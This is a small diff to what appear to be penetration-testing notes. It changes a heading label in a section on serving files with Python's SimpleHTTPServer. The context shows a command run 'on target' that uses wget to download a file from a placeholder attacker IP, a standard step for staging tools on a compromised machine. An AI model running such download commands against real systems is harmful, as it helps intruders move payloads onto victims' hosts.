@@ -46,7 +46,7 @@ Python SimpleHTTPServer
 python -m SimpleHTTPServer 80
 ```
 
-```#on target```
+```on target```
 ```bash
 wget <attackerip>:80/filename
 ```
